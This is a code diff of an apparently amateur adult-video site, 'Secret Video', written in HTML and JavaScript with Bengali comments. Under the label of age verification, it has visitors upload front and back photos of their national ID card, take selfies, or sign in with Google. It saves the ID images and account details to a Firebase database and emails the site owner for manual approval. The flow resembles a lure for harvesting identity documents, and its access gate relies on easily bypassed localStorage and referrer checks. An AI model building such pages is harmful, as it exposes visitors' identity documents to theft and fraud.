@@ -4,11 +4,29 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>Secret Video - Age Verification</title>
-  <link rel="icon" type="image/png" href="https://i.ibb.co/zWvmyGPT/1000109018.png">
+
+  <!-- ✅✅ টোকেন গার্ড: শুধুমাত্র মূল সাইটের ১৮+ বাটন দিয়ে আসলেই ঢুকতে পারবে -->
+  <script>
+    (function () {
+      var token = parseInt(localStorage.getItem('svAdultEntry') || '0');
+      var host = window.location.hostname;
+      var ref = document.referrer || '';
+
+      /* টোকেন ৩০ মিনিটের মধ্যে হলে বা একই সাইট থেকে এলে ঢুকতে পারবে */
+      var tokenValid = token && (Date.now() - token < 30 * 60 * 1000);
+      var fromSameSite = host && ref.indexOf(host) !== -1;
+
+      if (!tokenValid && !fromSameSite) {
+        window.location.replace('https://secret-video-smoky.vercel.app/');
+      }
+    })();
+  </script>
+
+  <link rel="icon" type="image/png" href="https://i.ibb.co/SDTwgBj6/1000109014.png">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
   <style>
-    /* ✅ ডানে-বামে নড়াচড়া ও জুম রোধ এবং স্কল নিশ্চিত করার জন্য CSS */
     html, body {
       max-width: 100%;
       overflow-x: hidden;
@@ -23,7 +41,6 @@
     body { background:#f4f5f8; padding:20px 24px 40px; padding-bottom: 80px; }
     .page { display:none; } .page.active { display:block; }
 
-    /* ✅ হেডার + লোগো */
     .hdr { display:flex; align-items:center; justify-content:space-between; margin-bottom:30px; position:relative; }
     .hdr-left { display:flex; align-items:center; gap:14px; }
     .back-btn { width:44px; height:44px; background:#ececec; border:none; border-radius:8px; color:#333; font-size:16px; cursor:pointer; }
@@ -32,14 +49,12 @@
     .logo .sname { font-size:24px; font-weight:800; color:#e50914; letter-spacing:0.5px; }
     .logo .sname span { color:#fff; background:#e50914; padding:2px 8px; border-radius:4px; font-size:16px; margin-left:4px; }
 
-    /* ✅ ক্লোজ বাটন */
     .close-btn { font-size: 28px; font-weight: 900; background: none; border: none; color: #000000; cursor: pointer; padding: 5px 10px; }
     .close-btn:hover { color: #555555; }
 
     .ttl { text-align:center; color:#333; font-size:24px; font-weight:600; margin-bottom:8px; }
     .sub { text-align:center; color:#777; font-size:17px; margin-bottom:28px; }
 
-    /* ✅ অপশন বাটন */
     .opt { width:100%; border:none; cursor:pointer; padding:0; display:flex; border-radius:6px; overflow:hidden; margin-bottom:4px; box-shadow:0 2px 8px rgba(0,0,0,0.15); }
     .opt:active { transform:scale(0.98); }
     .opt .ic { width:70px; display:flex; align-items:center; justify-content:center; font-size:26px; color:#fff; }
@@ -55,7 +70,6 @@
     .ordiv::before, .ordiv::after { content:''; flex:1; height:1px; background:#ccc; }
     .dbl { display:flex; align-items:center; gap:10px; color:#555; font-size:15px; margin-top:14px; }
 
-    /* ✅ সেলফি নির্দেশনা */
     .sttl { text-align:center; color:#2a3b55; font-size:26px; font-weight:800; margin-bottom:22px; }
     .sline { display:flex; align-items:center; justify-content:center; gap:10px; color:#3d4a5c; font-size:15px; font-weight:700; margin-bottom:12px; }
     .sline i { color:#2e9e4f; }
@@ -66,7 +80,6 @@
     .start-btn:active { transform:scale(0.98); }
     .start-btn:disabled { background:#aaa; }
 
-    /* ✅ গুগল ভেরিফিকেশন বাটন */
     .google-btn {
       width: 100%;
       background: #ffffff;
@@ -88,12 +101,10 @@
     .google-btn:hover { background: #f8f9fa; }
     .google-btn img { width: 20px; height: 20px; }
 
-    /* ✅ ইমেইল ইনপুট */
     .email-inp { width:100%; padding:14px; border:2px solid #ddd; border-radius:6px; font-size:16px; margin-bottom:12px; outline:none; background:#fff; }
     .email-inp:focus { border-color:#1272b6; }
     .resend-btn { width:100%; background:none; border:none; color:#1272b6; font-size:13px; font-weight:bold; padding:12px; cursor:pointer; }
 
-    /* ✅ ক্যামেরা */
     #camPage { position:fixed; inset:0; background:#000; z-index:100000; display:none; }
     #camVideo { width:100%; height:100%; object-fit:cover; }
     .oval { position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); width:72vw; max-width:320px; height:100vw; max-height:440px; border:3px solid rgba(255,255,255,0.9); border-radius:50%; }
@@ -101,14 +112,12 @@
     .cam-msg { position:absolute; bottom:7%; left:50%; transform:translateX(-50%); background:#127287; color:#fff; padding:16px 28px; border-radius:8px; font-size:19px; font-weight:800; white-space:nowrap; }
     .flash { position:absolute; inset:0; background:#fff; opacity:0; pointer-events:none; transition:opacity 0.3s; }
 
-    /* ✅ যাচাই হচ্ছে ও পেন্ডিং স্ক্রিন */
     .vwrap { text-align:center; padding-top:70px; }
     .spin { width:64px; height:64px; border:6px solid #e5e5e5; border-top-color:#1272b6; border-radius:50%; margin:0 auto 24px; animation:sp 1s linear infinite; }
     @keyframes sp { to { transform:rotate(360deg); } }
     .vstat { color:#333; font-size:19px; font-weight:700; }
     .vok { color:#2e9e4f; font-size:60px; margin-bottom:16px; }
 
-    /* ✅ এনআইডি কার্ড আপলোড বক্স */
     .nid-card-box { 
       background: #fff; padding: 16px; border-radius: 12px; border: 2px dashed #67a44c; 
       text-align: center; cursor: pointer; display: flex; flex-direction: column; align-items: center; justify-content: center;
@@ -120,7 +129,6 @@
     .nid-card-sub { font-size: 13px; color: #777; font-weight: 500; }
     .nid-preview-img { width: 100%; height: 120px; object-fit: cover; border-radius: 8px; margin-bottom: 8px; border: 1px solid #ddd; display: none; }
 
-    /* ✅ ১৮+ ভিডিও গ্যালারি */
     .top-nav { display:flex; justify-content:space-between; align-items:center; background:#fff; padding:10px 14px; border-radius:12px; box-shadow:0 2px 8px rgba(0,0,0,0.05); margin-bottom:16px; }
     .top-nav .right-icons { display:flex; gap:16px; align-items:center; font-size:18px; color:#333; cursor:pointer; }
     
@@ -135,23 +143,87 @@
     .gcard .p { position:absolute; top:40%; left:50%; transform:translate(-50%,-50%); width:32px; height:32px; background:rgba(229,9,20,0.9); border-radius:50%; display:flex; align-items:center; justify-content:center; color:#fff; font-size:12px; z-index:2; }
     .gcard .t { position:absolute; bottom:6px; left:0; width:100%; text-align:center; color:#fff; font-size:11px; font-weight:600; z-index:2; padding:0 4px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
 
-    /* ✅ বটম নেভিগেশন বার */
     .bot-nav { position:fixed; bottom:0; left:0; width:100%; background:#fff; display:flex; justify-content:space-around; align-items:center; padding:10px 0; border-top:1px solid #ddd; z-index:1000; box-shadow:0 -2px 10px rgba(0,0,0,0.05); }
     .bot-item { text-align:center; color:#777; font-size:11px; font-weight:600; cursor:pointer; background:none; border:none; flex:1; }
     .bot-item i { font-size:18px; display:block; margin-bottom:2px; }
     .bot-item.active { color:#e50914; }
 
     /* ✅ ভিডিও প্লেয়ার */
-    #playerModal { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.95); z-index:2000; flex-direction:column; justify-content:center; align-items:center; }
+    #playerModal { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.97); z-index:2000; flex-direction:column; justify-content:center; align-items:center; }
     .player-container { position: relative; width: 100%; max-width: 900px; display: flex; flex-direction: column; align-items: center; }
-    .vbox { position:relative; width:100%; aspect-ratio:16/9; background:#000; }
+    .vbox { position:relative; width:100%; aspect-ratio:16/9; background:#000; overflow:hidden; }
     .vbox iframe, .vbox video { width:100%; height:100%; border:none; }
     
-    /* ✅ প্লেয়ারের ওপর ডানপাশে নিশ্চিত ক্লোজ বাটন */
-    .pl-x { position:absolute; top:-45px; right:0; color:#fff; font-size:24px; font-weight:bold; cursor:pointer; background:rgba(255,255,255,0.2); width:38px; height:38px; border-radius:50%; display:flex; align-items:center; justify-content:center; z-index:5; }
+    .pl-x { position:absolute; top:-45px; right:0; color:#fff; font-size:24px; font-weight:bold; cursor:pointer; background:rgba(255,255,255,0.2); width:38px; height:38px; border-radius:50%; display:flex; align-items:center; justify-content:center; z-index:15; }
     .pl-x:hover { background:rgba(255,255,255,0.4); }
     
     .pl-t { margin-top:14px; font-size:15px; font-weight:600; color:#fff; text-align:center; padding:0 15px; }
+
+    /* ✅✅ কাস্টম ভিডিও কন্ট্রোল (⏪ ⏸️ ⏩) */
+    .video-overlay {
+      position: absolute;
+      top: 0; left: 0; right: 0; bottom: 40px;
+      display: flex;
+      justify-content: space-around;
+      align-items: center;
+      z-index: 10;
+      transition: opacity 0.3s ease;
+      pointer-events: none;
+    }
+    .ctl-btn {
+      pointer-events: auto;
+      background: rgba(0,0,0,0.45);
+      border: 2px solid rgba(255,255,255,0.3);
+      color: #fff;
+      width: 56px;
+      height: 56px;
+      border-radius: 50%;
+      font-size: 20px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.2s;
+      backdrop-filter: blur(4px);
+    }
+    .ctl-btn:active { transform: scale(0.9); background: rgba(229,9,20,0.8); }
+
+    .video-progress-wrap {
+      position: absolute;
+      bottom: 0; left: 0; right: 0;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 8px 12px;
+      background: linear-gradient(to top, rgba(0,0,0,0.9), transparent);
+      z-index: 11;
+      transition: opacity 0.3s ease;
+    }
+    .video-progress-wrap input[type="range"] {
+      flex: 1;
+      height: 4px;
+      accent-color: #e50914;
+      cursor: pointer;
+      -webkit-appearance: none;
+      background: rgba(255,255,255,0.3);
+      border-radius: 2px;
+      outline: none;
+    }
+    .video-progress-wrap input[type="range"]::-webkit-slider-thumb {
+      -webkit-appearance: none;
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background: #e50914;
+      cursor: pointer;
+    }
+    .video-progress-wrap span {
+      color: #fff;
+      font-size: 11px;
+      font-weight: 600;
+      min-width: 38px;
+      text-align: center;
+    }
   </style>
 </head>
 <body>
@@ -160,9 +232,9 @@
   <div class="page active" id="optPage">
     <div class="hdr">
       <div class="hdr-left">
-        <div class="logo"><img src="https://i.ibb.co/zWvmyGPT/1000109018.png" alt="Secret Video"><span class="sname">SECRET<span>VIDEO</span></span></div>
+        <div class="logo"><img src="https://i.ibb.co/SDTwgBj6/1000109014.png" alt="Secret Video"><span class="sname">SECRET<span>VIDEO</span></span></div>
       </div>
-      <button type="button" class="close-btn" onclick="openGallery()">✕</button>
+      <button type="button" class="close-btn" onclick="closeToVerification()">✕</button>
     </div>
     <h1 class="ttl">VERIFY YOUR AGE TO CONTINUE</h1>
     <p class="sub">Safe, secure, and free.</p>
@@ -199,9 +271,9 @@
     <div class="hdr">
       <div class="hdr-left">
         <button type="button" class="back-btn" onclick="goPage('optPage')"><i class="fa-solid fa-chevron-left"></i></button>
-        <div class="logo"><img src="https://i.ibb.co/zWvmyGPT/1000109018.png" alt="Secret Video"><span class="sname">SECRET<span>VIDEO</span></span></div>
+        <div class="logo"><img src="https://i.ibb.co/SDTwgBj6/1000109014.png" alt="Secret Video"><span class="sname">SECRET<span>VIDEO</span></span></div>
       </div>
-      <button type="button" class="close-btn" onclick="openGallery()">✕</button>
+      <button type="button" class="close-btn" onclick="closeToVerification()">✕</button>
     </div>
     <h2 class="sttl">When you start...</h2>
     <div class="sline"><i class="fa-solid fa-circle-check"></i> Center your face</div>
@@ -220,9 +292,9 @@
     <div class="hdr">
       <div class="hdr-left">
         <button type="button" class="back-btn" onclick="goPage('optPage')"><i class="fa-solid fa-chevron-left"></i></button>
-        <div class="logo"><img src="https://i.ibb.co/zWvmyGPT/1000109018.png" alt="Secret Video"><span class="sname">SECRET<span>VIDEO</span></span></div>
+        <div class="logo"><img src="https://i.ibb.co/SDTwgBj6/1000109014.png" alt="Secret Video"><span class="sname">SECRET<span>VIDEO</span></span></div>
       </div>
-      <button type="button" class="close-btn" onclick="openGallery()">✕</button>
+      <button type="button" class="close-btn" onclick="closeToVerification()">✕</button>
     </div>
     <h2 class="sttl">📧 Email Verification</h2>
     <p style="text-align:center; color:#777; font-size:14px; margin-bottom:20px;">আপনার আসল ইমেইল দিন —<br>৬ ডিজিটের ভেরিফিকেশন কোড ইমেইলে যাবে</p>
@@ -241,9 +313,9 @@
     <div class="hdr">
       <div class="hdr-left">
         <button type="button" class="back-btn" onclick="goPage('emailPage')"><i class="fa-solid fa-chevron-left"></i></button>
-        <div class="logo"><img src="https://i.ibb.co/zWvmyGPT/1000109018.png" alt="Secret Video"><span class="sname">SECRET<span>VIDEO</span></span></div>
+        <div class="logo"><img src="https://i.ibb.co/SDTwgBj6/1000109014.png" alt="Secret Video"><span class="sname">SECRET<span>VIDEO</span></span></div>
       </div>
-      <button type="button" class="close-btn" onclick="openGallery()">✕</button>
+      <button type="button" class="close-btn" onclick="closeToVerification()">✕</button>
     </div>
     <h2 class="sttl">Enter Code</h2>
     <p style="text-align:center; color:#777; font-size:14px; margin-bottom:16px;">
@@ -259,9 +331,9 @@
     <div class="hdr">
       <div class="hdr-left">
         <button type="button" class="back-btn" onclick="goPage('optPage')"><i class="fa-solid fa-chevron-left"></i></button>
-        <div class="logo"><img src="https://i.ibb.co/zWvmyGPT/1000109018.png" alt="Secret Video"><span class="sname">SECRET<span>VIDEO</span></span></div>
+        <div class="logo"><img src="https://i.ibb.co/SDTwgBj6/1000109014.png" alt="Secret Video"><span class="sname">SECRET<span>VIDEO</span></span></div>
       </div>
-      <button type="button" class="close-btn" onclick="openGallery()">✕</button>
+      <button type="button" class="close-btn" onclick="closeToVerification()">✕</button>
     </div>
     <h2 class="sttl" style="font-size:22px; display:flex; align-items:center; justify-content:center; gap:8px;">🪪 NID Card Verification</h2>
     <p style="text-align:center; color:#666; font-size:14px; margin-bottom:18px; font-weight:500;">গ্যালারি থেকে এনআইডি কার্ডের সামনের ও পিছনের ছবি সিলেক্ট করুন</p>
@@ -289,15 +361,16 @@
     <button type="button" class="start-btn" id="nidSubmitBtn" onclick="submitNidPhotos()" style="background:#2e9e4f; margin-top:10px;">SUBMIT NID PHOTOS 🚀</button>
   </div>
 
-  <!-- ✅ পেন্ডিং পেজ -->
+  <!-- ✅ পেন্ডিং পেজ (Secret Video Team রিভিউ) -->
   <div class="page" id="pendingPage">
     <div class="vwrap" style="padding-top:50px; padding-left:15px; padding-right:15px;">
       <div class="spin" id="pendingSpin"></div>
-      <div class="vok" id="statusIcon">⏳</div>
-      <h2 id="statusTitle" style="color:#333; margin-bottom:10px; font-size:22px;">এনআইডি কার্ড রিভিউতে রয়েছে</h2>
-      <p id="statusDesc" style="color:#666; font-size:15px; line-height:1.6; margin-bottom:25px;">
-        আপনার এনআইডি কার্ডের ছবি সফলভাবে অ্যাডমিনের কাছে পাঠানো হয়েছে। অনুগ্রহ করে অ্যাডমিন এপ্রুভ করার জন্য অপেক্ষা করুন।
+      <div class="vok" id="statusIcon" style="display:none;">⏳</div>
+      <h2 id="statusTitle" style="color:#333; margin-bottom:10px; font-size:22px;">Secret Video Team রিভিউ করছে</h2>
+      <p id="statusDesc" style="color:#666; font-size:15px; line-height:1.6; margin-bottom:10px;">
+        আপনার ভেরিফিকেশন সফল হয়েছে! এখন Secret Video Team রিভিউ করছে।<br>রিভিউ শেষ হলেই এই পেজেই ENTER বাটন দেখতে পাবেন।
       </p>
+      <p id="pendingMethod" style="color:#1272b6; font-size:13px; font-weight:700; margin-bottom:25px;"></p>
       
       <button type="button" class="start-btn" id="enterGalleryBtn" onclick="openGallery()" style="display:none; background:#2e9e4f; font-size:18px;">
         🎉 APPROVED! ENTER VIDEOS
@@ -305,6 +378,10 @@
 
       <button type="button" class="resend-btn" onclick="checkApprovalStatus()" style="margin-top:15px; font-size:15px;">
         🔄 স্ট্যাটাস চেক করুন (Refresh Status)
+      </button>
+
+      <button type="button" class="resend-btn" id="retryBtn" onclick="retryVerification()" style="display:none; margin-top:5px; color:#e50914; font-weight:bold;">
+        🔁 আবার ভেরিফিকেশন করুন
       </button>
     </div>
   </div>
@@ -329,10 +406,10 @@
   <!-- ✅ ভিডিও গ্যালারি পেজ -->
   <div class="page" id="galleryPage">
     <div class="top-nav">
-      <div class="logo"><img src="https://i.ibb.co/zWvmyGPT/1000109018.png" alt="Secret Video"><span class="sname" style="font-size:20px;">SECRET<span>VIDEO</span></span></div>
+      <div class="logo"><img src="https://i.ibb.co/SDTwgBj6/1000109014.png" alt="Secret Video"><span class="sname" style="font-size:20px;">SECRET<span>VIDEO</span></span></div>
       <div class="right-icons">
         <i class="fa-solid fa-magnifying-glass" onclick="alert('Search feature')"></i>
-        <button type="button" class="close-btn" onclick="goPage('optPage')" style="font-size: 26px;">✕</button>
+        <button type="button" class="close-btn" onclick="closeToVerification()" style="font-size: 26px;">✕</button>
         <i class="fa-solid fa-right-from-bracket" style="color:#e50914; padding-left: 5px;" title="Logout" onclick="handleLogout()"></i>
       </div>
     </div>
@@ -348,7 +425,7 @@
     </div>
   </div>
 
-  <!-- ✅ ভিডিও প্লেয়ার মোডাল (বাইরে টাচ করলে আর কাটবে না, শুধু X বাটনে কাটবে) -->
+  <!-- ✅ ভিডিও প্লেয়ার মোডাল -->
   <div id="playerModal">
     <div class="player-container">
       <button type="button" class="pl-x" onclick="closePlayer()">✕</button>
@@ -411,6 +488,138 @@
 
     let currentVerifyId = null;
 
+    /* ✅ Secret Video Team এপ্রুভ করলে অটোমেটিক ধরার জন্য লিসেনার চালু */
+    watchApprovalStatus();
+
+    /* ========================================================
+       ✅✅ এপ্রুভাল সিস্টেম (nidRequests নোড)
+       ======================================================== */
+
+    async function requestAdminAccess(method, extraData = {}) {
+      /* আগে থেকেই এপ্রুভ করা থাকলে সরাসরি গ্যালারিতে */
+      try {
+        const snap = await get(ref(db, 'nidRequests/' + currentUserId));
+        if (snap.exists() && snap.val().status === 'approved') {
+          openGallery();
+          return;
+        }
+      } catch(e) {}
+
+      /* ফায়ারবেসে পেন্ডিং রিকুয়েস্ট পাঠানো */
+      try {
+        if (!auth.currentUser) await signInAnonymously(auth);
+        await set(ref(db, 'nidRequests/' + currentUserId), {
+          userId: currentUserId,
+          method: method,
+          status: 'pending',
+          createdAt: Date.now(),
+          ...extraData
+        });
+      } catch (e) {
+        alert("⚠️ সার্ভারে রিকুয়েস্ট পাঠানো যায়নি!\nকারণ: " + (e.code || e.message) + "\n\nইন্টারনেট চেক করে আবার চেষ্টা করুন।");
+        goPage('optPage');
+        return;
+      }
+
+      /* নোটিফিকেশন ইমেইল */
+      try {
+        await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
+          to_email: TARGET_OWNER_EMAIL,
+          email: TARGET_OWNER_EMAIL,
+          passcode: `NEW 18+ ACCESS REQUEST!\nMethod: ${method}\nUser ID: ${currentUserId}\nStatus: Pending Review.\n\nApprove in Admin Panel or Firebase:\nnidRequests/${currentUserId} -> status = "approved"`
+        });
+      } catch (e) {}
+
+      showPendingScreen(method);
+    }
+
+    function watchApprovalStatus() {
+      onValue(ref(db, 'nidRequests/' + currentUserId), (snap) => {
+        if (!snap.exists()) return;
+        const data = snap.val();
+
+        if (data.status === 'approved') {
+          localStorage.setItem('adminApproved18', 'yes');
+          if (document.getElementById('pendingPage').classList.contains('active')) {
+            showApprovedOnPending();
+          }
+        } else if (data.status === 'rejected') {
+          localStorage.removeItem('adminApproved18');
+          if (document.getElementById('galleryPage').classList.contains('active')) {
+            alert("দুঃখিত! আপনার এক্সেস গ্রহণ করা হয়নি।");
+            goPage('optPage');
+          } else if (document.getElementById('pendingPage').classList.contains('active')) {
+            showRejectedOnPending();
+          }
+        }
+      });
+    }
+
+    function showPendingScreen(method) {
+      const methodNames = {
+        selfie: '🤳 Selfie Verification',
+        email: '📧 Email Verification',
+        google: '🔒 Google Login',
+        nid: '🪪 NID Card Verification'
+      };
+      document.getElementById('pendingSpin').style.display = 'block';
+      document.getElementById('statusIcon').style.display = 'none';
+      document.getElementById('statusTitle').innerText = "Secret Video Team রিভিউ করছে";
+      document.getElementById('statusDesc').innerHTML = "আপনার ভেরিফিকেশন সফল হয়েছে! এখন Secret Video Team রিভিউ করছে।<br>রিভিউ শেষ হলেই এই পেজেই ENTER বাটন দেখতে পাবেন।";
+      document.getElementById('pendingMethod').innerText = methodNames[method] || '';
+      document.getElementById('enterGalleryBtn').style.display = 'none';
+      document.getElementById('retryBtn').style.display = 'none';
+      goPage('pendingPage');
+    }
+
+    function showApprovedOnPending() {
+      document.getElementById('pendingSpin').style.display = 'none';
+      document.getElementById('statusIcon').innerHTML = '✅';
+      document.getElementById('statusIcon').style.display = 'block';
+      document.getElementById('statusTitle').innerText = "অভিনন্দন! আপনার একাউন্ট অনুমোদিত হয়েছে।";
+      document.getElementById('statusDesc').innerText = "এখন নিচের বাটনে ক্লিক করে সরাসরি ভিডিও দেখতে পারবেন।";
+      document.getElementById('enterGalleryBtn').style.display = 'block';
+      document.getElementById('retryBtn').style.display = 'none';
+      goPage('pendingPage');
+    }
+
+    function showRejectedOnPending() {
+      document.getElementById('pendingSpin').style.display = 'none';
+      document.getElementById('statusIcon').innerHTML = '❌';
+      document.getElementById('statusIcon').style.display = 'block';
+      document.getElementById('statusTitle').innerText = "দুঃখিত! রিকুয়েস্ট গ্রহণ করা হয়নি।";
+      document.getElementById('statusDesc').innerText = "আপনার রিকুয়েস্ট গ্রহণ করা হয়নি। আবার ভেরিফিকেশন করতে নিচের বাটনে ক্লিক করুন।";
+      document.getElementById('enterGalleryBtn').style.display = 'none';
+      document.getElementById('retryBtn').style.display = 'block';
+      goPage('pendingPage');
+    }
+
+    window.retryVerification = () => {
+      goPage('optPage');
+    };
+
+    window.checkApprovalStatus = async () => {
+      try {
+        if (!auth.currentUser) await signInAnonymously(auth);
+        const snap = await get(ref(db, 'nidRequests/' + currentUserId));
+        if (snap.exists()) {
+          const data = snap.val();
+          if (data.status === 'approved') {
+            showApprovedOnPending();
+          } else if (data.status === 'rejected') {
+            showRejectedOnPending();
+          } else {
+            alert("⏳ আপনার রিকুয়েস্ট এখনো রিভিউতে আছে। কিছুক্ষণ পর আবার চেক করুন।");
+          }
+        } else {
+          alert("কোনো রিকুয়েস্ট পাওয়া যায়নি। আগে ভেরিফিকেশন করুন।");
+          goPage('optPage');
+        }
+      } catch (e) {
+        alert("স্ট্যাটাস চেক করতে সমস্যা: " + (e.code || e.message));
+      }
+    };
+
     window.loginWithGoogle = async () => {
       try {
         const provider = new GoogleAuthProvider();
@@ -428,7 +637,7 @@
           console.warn("DB save skipped:", dbErr.message);
         }
 
-        openGallery();
+        await requestAdminAccess('google', { email: user.email || '', name: user.displayName || '' });
       } catch (e) {
         alert("গুগল দিয়ে লগইন করতে সমস্যা হয়েছে: " + e.message);
       }
@@ -487,8 +696,8 @@
       const frontFile = document.getElementById('nidFrontFile').files[0];
       const backFile = document.getElementById('nidBackFile').files[0];
 
-      if (!frontFile) return alert("দয়া করে এনআইডি কার্ডের সামনের অংশ আপলোড করুন!");
-      if (!backFile) return alert("দয়া করে এনআইডি কার্ডের পিছনের অংশ আপলোড করুন!");
+      if (!frontFile) return alert("দয়া করে এনআইডি কার্ডের সামনের অংশ আপলোড করুন!");
+      if (!backFile) return alert("দয়া করে এনআইডি কার্ডের পিছনের অংশ আপলোড করুন!");
 
       const btn = document.getElementById('nidSubmitBtn');
       btn.disabled = true;
@@ -502,81 +711,48 @@
 
         await set(ref(db, 'nidRequests/' + currentUserId), {
           userId: currentUserId,
+          method: 'nid',
           frontImage: frontBase64,
           backImage: backBase64,
           status: 'pending',
           createdAt: Date.now()
         });
 
-        const emailParams = {
-          to_email: TARGET_OWNER_EMAIL,
-          email: TARGET_OWNER_EMAIL,
-          passcode: `NEW NID VERIFICATION REQUEST!\nUser ID: ${currentUserId}\nStatus: Pending Approval.\n\nPlease check your Firebase Database to view the uploaded NID images.`
-        };
+        try {
+          await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
+            to_email: TARGET_OWNER_EMAIL,
+            email: TARGET_OWNER_EMAIL,
+            passcode: `NEW NID ACCESS REQUEST!\nUser ID: ${currentUserId}\nStatus: Pending Review.\n\nCheck Admin Panel or Firebase: nidRequests/${currentUserId} (frontImage/backImage) -> status = "approved"`
+          });
+        } catch (e) {}
 
-        await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, emailParams);
-
-        showPendingScreen("⏳ এনআইডি কার্ড রিভিউতে রয়েছে", "আপনার এনআইডি কার্ড সফলভাবে সাবমিট হয়েছে। অ্যাডমিন এপ্রুভ করলেই আপনি ভিডিও দেখতে পাবেন।", true);
+        showPendingScreen('nid');
 
       } catch (e) {
         console.error("NID Submission Error:", e);
-        await set(ref(db, 'nidRequests/' + currentUserId), {
-          userId: currentUserId,
-          status: 'pending',
-          createdAt: Date.now()
-        }).catch(() => {});
-
-        showPendingScreen("⏳ এনআইডি কার্ড রিভিউতে রয়েছে", "আপনার এনআইডি কার্ড সফলভাবে সাবমিট হয়েছে। অ্যাডমিন এপ্রুভ করলেই আপনি ভিডিও দেখতে পাবেন।", true);
+        alert("⚠️ NID সাবমিট করা যায়নি!\nকারণ: " + (e.code || e.message));
+        goPage('optPage');
       } finally {
         btn.disabled = false;
         btn.innerText = "SUBMIT NID PHOTOS 🚀";
       }
     };
 
-    function showPendingScreen(title, desc, showLoader) {
-      document.getElementById('statusTitle').innerText = title;
-      document.getElementById('statusDesc').innerText = desc;
-      document.getElementById('pendingSpin').style.display = showLoader ? 'block' : 'none';
-      document.getElementById('statusIcon').style.display = showLoader ? 'block' : 'none';
-      document.getElementById('enterGalleryBtn').style.display = 'none';
-      goPage('pendingPage');
-    }
-
-    window.checkApprovalStatus = async () => {
-      try {
-        if (!auth.currentUser) await signInAnonymously(auth);
-        const snap = await get(ref(db, 'nidRequests/' + currentUserId));
-        if (snap.exists()) {
-          const data = snap.val();
-          if (data.status === 'approved') {
-            document.getElementById('pendingSpin').style.display = 'none';
-            document.getElementById('statusIcon').innerHTML = '✅';
-            document.getElementById('statusIcon').style.display = 'block';
-            document.getElementById('statusTitle').innerText = "অভিনন্দন! আপনার NID এপ্রুভ করা হয়েছে।";
-            document.getElementById('statusDesc').innerText = "এখন আপনি নিচের বাটনে ক্লিক করে সরাসরি ভিডিও দেখতে পারবেন।";
-            document.getElementById('enterGalleryBtn').style.display = 'block';
-          } else if (data.status === 'rejected') {
-            document.getElementById('pendingSpin').style.display = 'none';
-            document.getElementById('statusIcon').innerHTML = '❌';
-            document.getElementById('statusIcon').style.display = 'block';
-            document.getElementById('statusTitle').innerText = "দুঃখিত! আপনার NID রিজেক্ট করা হয়েছে।";
-            document.getElementById('statusDesc').innerText = "সঠিক NID কার্ডের ছবি দিয়ে আবার চেষ্টা করুন।";
-          } else {
-            alert("⚠️ আপনার অ্যাকাউন্টটি এখনো পেন্ডিং (Pending) আছে। অ্যাডমিন এখনো এপ্রুভ করেনি।");
-          }
-        } else {
-          alert("কোনো রিকুয়েস্ট পাওয়া যায়নি। দয়া করে আগে NID সাবমিট করুন।");
-          goPage('nidPage');
-        }
-      } catch (e) {
-        alert("স্ট্যাটাস চেক করতে সমস্যা হয়েছে। আবার চেষ্টা করুন।");
-      }
-    };
-
     window.openGallery = () => {
       localStorage.setItem('ageVerified18', 'yes');
+      localStorage.setItem('verifyTime18', Date.now().toString());
+      localStorage.setItem('adminApproved18', 'yes');
       buildGallery();
       goPage('galleryPage');
+    };
+
+    window.closeToVerification = () => {
+      if (localStorage.getItem('adminApproved18') === 'yes') {
+        buildGallery();
+        goPage('galleryPage');
+      } else {
+        goPage('optPage');
+      }
     };
 
     window.sendCode = async () => {
@@ -624,7 +800,7 @@
 
         if (data.code === entered) {
           await update(ref(db, 'accessRequests/' + currentVerifyId), { verified: true });
-          openGallery();
+          await requestAdminAccess('email', { email: data.email || '' });
         } else {
           alert("❌ ভুল কোড! আবার চেষ্টা করুন।");
         }
@@ -645,50 +821,53 @@
     }
 
     /* ========================================================
-       ✅ ইউনিভার্সাল ভিডিও ও এমবেড হ্যান্ডলার
+       ✅ ইউনিভার্সাল ভিডিও কনভার্টার
        ======================================================== */
-    function toEmbed(u) {
-      if (!u) return '';
-      u = String(u).trim();
-      
-      if (u.includes('<iframe') || u.includes('<video')) {
-        return u.replace(/width="[^"]*"/g, 'width="100%"').replace(/height="[^"]*"/g, 'height="100%"');
-      }
+    function convertToEmbedUrl(rawUrl) {
+      let url = String(rawUrl || '').trim();
+      if (!url) return '';
 
-      let embedUrl = u;
+      if (url.includes('facebook.com/plugins/') || url.includes('tiktok.com/embed/') || url.includes('dailymotion.com/embed/') || url.includes('ok.ru/videoembed/') || url.includes('player.vimeo.com/') || url.includes('streamable.com/e/') || url.includes('drive.google.com')) return url;
 
-      let driveMatch = u.match(/drive\.google\.com\/file\/d\/([a-zA-Z0-9_-]+)/);
-      if (driveMatch) {
-        embedUrl = 'https://drive.google.com/file/d/' + driveMatch[1] + '/preview';
-      }
+      let m = url.match(/(?:youtube\.com\/(?:watch\?.*v=|shorts\/|embed\/|live\/)|youtu\.be\/)([a-zA-Z0-9_-]{11})/);
+      if (m) return 'https://www.youtube.com/embed/' + m[1] + '?autoplay=1&rel=0';
 
-      if (u.includes('xnxx.com')) {
-        if (u.includes('embedframe/')) {
-          embedUrl = u;
-        } else {
-          let matchId = u.match(/embedframe\/([a-zA-Z0-9_-]+)/) || u.match(/video-([a-zA-Z0-9_-]+)/);
-          if (matchId && matchId[1]) {
-            embedUrl = 'https://www.xnxx.com/embedframe/' + matchId[1];
-          } else {
-            let parts = u.split('/');
-            let videoId = parts.find(p => p.startsWith('u') || p.length > 5) || parts[parts.length - 2];
-            if (videoId) {
-              embedUrl = 'https://www.xnxx.com/embedframe/' + videoId;
-            }
-          }
